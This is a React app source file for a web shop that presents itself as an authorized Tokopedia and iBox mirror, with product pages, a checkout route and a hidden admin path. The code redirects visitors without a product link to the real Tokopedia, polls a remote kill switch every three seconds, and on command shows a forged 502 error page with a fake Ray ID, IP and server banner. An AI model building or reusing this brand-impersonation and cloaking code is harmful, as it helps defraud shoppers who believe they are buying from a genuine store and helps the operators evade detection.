import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, useLocation } from 'react-router-dom';
import { DotLottieReact } from '@lottiefiles/dotlottie-react';
import ProductDetail from './components/ProductDetail';
import AdminDashboard from './components/AdminDashboard';
import AdminPinEntry from './components/AdminPinEntry';
import Checkout from './components/Checkout';
import IsBlocked from './components/IsBlocked';
import { initialProduksList } from './data';
import { Product } from './types';
import { supabase } from './lib/supabase';

function TokopediaSplashScreen({ message }: { message: string }) {
  const [shouldRender, setShouldRender] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShouldRender(true);
    }, 180);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-between p-8 font-sans max-w-md mx-auto shadow-2xl border-x border-gray-100">
      <div className="flex-1 flex flex-col items-center justify-center gap-6">
        <div className="w-56 h-56 flex items-center justify-center relative">
          {/* Authentic green spinning loader as placeholder/fallback */}
          <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-10 h-10 border-4 border-[#00AA5B]/20 border-t-[#00AA5B] rounded-full animate-spin"></div>
          </div>
          
          {shouldRender && (
            <div className="w-full h-full z-10 bg-white">
              <DotLottieReact
                src="https://lottie.host/774f8994-8ee1-4e19-bd71-9ad3c2438ddf/h7CR2SH9YJ.lottie"
                loop
                autoplay
              />
            </div>
          )}
        </div>
        <div className="text-center space-y-1">
          <p className="text-sm font-black text-[#00AA5B] tracking-wide uppercase">Tokopedia Shop</p>
          <p className="text-xs font-bold text-gray-400">{message}</p>
        </div>
      </div>
      
      {/* Brand Footer */}
      <div className="flex flex-col items-center gap-1.5 pb-6">
        <span className="text-[9px] font-bold text-gray-300 uppercase tracking-[0.2em]">Authorized Shop Mirror</span>
        <div className="flex items-center gap-1.5 text-gray-400 select-none">
          <span className="text-xs font-black text-[#00AA5B]">tokopedia</span>
          <span className="text-xs font-bold text-gray-200">|</span>
          <span className="text-[10px] font-bold text-gray-400 tracking-wider">iBox Authorized</span>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  const [produks, setProduks] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [isGlobalBlocked, setIsGlobalBlocked] = useState<boolean>(false);
  const [isAdminAuthorized, setIsAdminAuthorized] = useState(() => {
    return sessionStorage.getItem('adminAuthorized') === 'true';
  });

  const navigate = useNavigate();
  const location = useLocation();

  // Backward compatibility: Redirect from query param (?produks_id=...) to path parameter (/:produks_id)
  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const queryId = searchParams.get('produks_id');
    if (queryId && location.pathname === '/') {
      navigate(`/${queryId}`, { replace: true });
    }
  }, [location.search, location.pathname, navigate]);

  useEffect(() => {
    const checkBlockStatus = async () => {
      try {
        const res = await fetch("https://jvqrturbkgyxsycdcfwp.supabase.co/rest/v1/blocked?apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp2cXJ0dXJia2d5eHN5Y2RjZndwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0MDUzNjEsImV4cCI6MjA5Mjk4MTM2MX0.zMwmCC5s6M1hvPD5cRcde-cGxRc5E9NsIGoEnE2htis");
        if (res.ok) {
          const data = await res.json();
          if (Array.isArray(data)) {
            const hasBlocked = data.some(item => item.is_blocked === true);
            setIsGlobalBlocked(hasBlocked);
          }
        }
      } catch (err) {
        console.error("Error checking global block status:", err);
      }
    };
    
    checkBlockStatus();
    // Poll every 3 seconds to ensure incredibly fast lock/unlock feedback
    const interval = setInterval(checkBlockStatus, 3000);
    return () => clearInterval(interval);
  }, []);



  const fetchProducts = async () => {
    try {
      const { data, error } = await supabase
        .from('produks')
        .select('*');
      if (error) throw error;
      setProduks(data || []);
    } catch (error) {
      console.error('Error fetching products:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchProducts();

    const channel = supabase
      .channel('schema-db-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'produks'
        },
        () => {
          fetchProducts();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  useEffect(() => {
    // Disable iOS Safari gestures
    const handleGesture = (e: Event) => e.preventDefault();
    document.addEventListener("gesturestart", handleGesture);
    document.addEventListener("gesturechange", handleGesture);
    document.addEventListener("gestureend", handleGesture);

    // Disable Ctrl + Scroll zoom
    const handleWheel = (e: WheelEvent) => {
      if (e.ctrlKey) {
        e.preventDefault();
      }
    };
    window.addEventListener("wheel", handleWheel, { passive: false });

    // Disable keyboard zoom
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        (e.ctrlKey && (e.key === "+" || e.key === "-" || e.key === "=")) ||
        (e.ctrlKey && e.key === "0")
      ) {
        e.preventDefault();
      }
    };
    window.addEventListener("keydown", handleKeyDown);

    return () => {
      document.removeEventListener("gesturestart", handleGesture);
      document.removeEventListener("gesturechange", handleGesture);
      document.removeEventListener("gestureend", handleGesture);
      window.removeEventListener("wheel", handleWheel);
      window.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  const handleAddProduct = async (newProduct: Product) => {
    try {
      const { error } = await supabase
        .from('produks')
        .insert([newProduct]);
      if (error) throw error;
    } catch (error: any) {
      console.error('Error adding product:', error);
      alert('Gagal menambah produk: ' + (error?.message || error));
    }
  };

  const handleEditProduct = async (updatedProduct: Product) => {
    try {
      const { error } = await supabase
        .from('produks')
        .update(updatedProduct)
        .eq('produks_id', updatedProduct.produks_id);
      if (error) throw error;
    } catch (error: any) {
      console.error('Error editing product:', error);
      alert('Gagal mengubah produk: ' + (error?.message || error));
    }
  };

  const handleDeleteProduct = async (id: string) => {
    try {
      const { error } = await supabase
        .from('produks')
        .delete()
        .eq('produks_id', id);
      if (error) throw error;
    } catch (error: any) {
      console.error('Error deleting product:', error);
      alert('Gagal menghapus produk: ' + (error?.message || error));
    }
  };

  const handleAuthSuccess = () => {
    setIsAdminAuthorized(true);
    sessionStorage.setItem('adminAuthorized', 'true');
  };

  if (loading) {
    return <TokopediaSplashScreen message="Menghubungkan ke Database..." />;
  }

  if (isGlobalBlocked) {
    return <BadGatewayErrorPage />;
  }

  return (
    <Routes>
      <Route path="/is-blocked" element={<IsBlocked />} />
      <Route path="/makkasau" element={
        <AdminDashboard 
          produks={produks} 
          onAdd={handleAddProduct}
          onEdit={handleEditProduct}
          onDelete={handleDeleteProduct}
          onRefresh={fetchProducts}
        />
      } />
      <Route path="/checkout" element={
        <Checkout 
          produks={produks} 
          onBack={() => {
            const searchParams = new URLSearchParams(location.search);
            const currentId = searchParams.get('produks_id');
            if (currentId) {
              navigate(`/${currentId}`);
            } else {
              navigate(-1);
            }
          }} 
        />
      } />
      <Route path="/:produks_id" element={<ProductDetail key={location.pathname} produks={produks} />} />
      <Route path="/" element={<RootRedirect />} />
    </Routes>
  );
}

function RootRedirect() {
  const location = useLocation();

  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const queryId = searchParams.get('produks_id');
    if (!queryId) {
      window.location.replace('https://tokopedia.com/');
    }
  }, [location]);

  return <TokopediaSplashScreen message="Mengalihkan ke Tokopedia..." />;
}

function BadGatewayErrorPage() {
  const rayId = React.useMemo(() => {
    return Math.random().toString(16).substring(2, 10).toUpperCase() + Math.random().toString(16).substring(2, 10).toUpperCase();
  }, []);
  const timestamp = React.useMemo(() => {
    return new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
  }, []);

  return (
    <div className="min-h-screen bg-[#F9FAFB] text-[#374151] font-sans flex flex-col justify-between p-6 sm:p-12">
      <div className="max-w-4xl mx-auto w-full pt-6 sm:pt-12">
        {/* Error Code & Large Header */}
        <div className="border-b border-gray-200 pb-8">
          <div className="text-sm font-black uppercase tracking-widest text-rose-600 mb-2">Error 502</div>
          <h1 className="text-4xl sm:text-5xl font-black tracking-tight text-gray-900 mb-3">Bad Gateway</h1>
          <p className="text-sm sm:text-base text-gray-500 font-medium">The proxy server received an invalid response from an upstream server.</p>
        </div>

        {/* Diagnostic CDN-style connection status map */}
        <div className="my-10 grid grid-cols-1 md:grid-cols-2 gap-6 relative">
          {/* Item 1: Browser */}
          <div className="bg-white rounded-2xl border border-red-200 p-6 shadow-sm flex flex-col items-center text-center">
            <div className="w-12 h-12 rounded-full bg-rose-50 text-rose-600 flex items-center justify-center mb-4">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-sm font-bold text-gray-900 mb-1">Your Browser</h3>
            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold bg-rose-50 text-rose-700 mb-1">not Working</span>
            <span className="text-[10px] font-mono text-gray-400 font-bold">IP: 114.122.14.88</span>
          </div>

          {/* Item 2: Origin Server */}
          <div className="bg-white rounded-2xl border border-red-200 p-6 shadow-sm flex flex-col items-center text-center">
            <div className="w-12 h-12 rounded-full bg-rose-50 text-rose-600 flex items-center justify-center mb-4">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-sm font-bold text-gray-900 mb-1">Host Server (Tokopedia Mirror)</h3>
            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold bg-rose-50 text-rose-700">Error 502</span>
          </div>
        </div>

        {/* Technical Explanations */}
        <div className="bg-white rounded-2xl border border-gray-100 p-6 sm:p-8 shadow-sm space-y-6">
          <div>
            <h2 className="text-base font-black text-gray-900 mb-2">What happened?</h2>
            <p className="text-sm leading-relaxed text-gray-600">The gateway server received an invalid or empty response from the upstream application server. This usually occurs when the backend application host crashed, is under maintenance, or fails to properly handshake with our reverse proxy layer.</p>
          </div>

          <div className="border-t border-gray-100 pt-6">
            <h2 className="text-base font-black text-gray-900 mb-2">What can I do?</h2>
            <p className="text-sm leading-relaxed text-gray-600">If you are a regular visitor, please try refreshing the page in a few minutes. If you are the system administrator, please review your application health checks, gateway endpoints, and verify that the target service container is up and listening on port 3000.</p>
          </div>
        </div>
      </div>

      {/* Footer diagnostic block */}
      <div className="max-w-4xl mx-auto w-full text-[11px] text-gray-400 font-mono py-8 border-t border-gray-100 mt-12 flex flex-col sm:flex-row justify-between gap-4">
        <div className="space-y-1">
          <p>Ray ID: <span className="text-gray-600 font-bold">{rayId}</span></p>
          <p>Client IP: <span className="text-gray-600 font-bold">114.122.14.88</span></p>
          <p>Timestamp: <span className="text-gray-600 font-bold">{timestamp}</span></p>
        </div>
        <div className="space-y-1 sm:text-right font-bold">
          <p>Server: <span className="text-gray-600">nginx/1.26.1 (CentOS)</span></p>
          <p>Gateway Connection: <span className="text-rose-500">Failed (Upstream Error)</span></p>
        </div>
      </div>
    </div>
  );
}
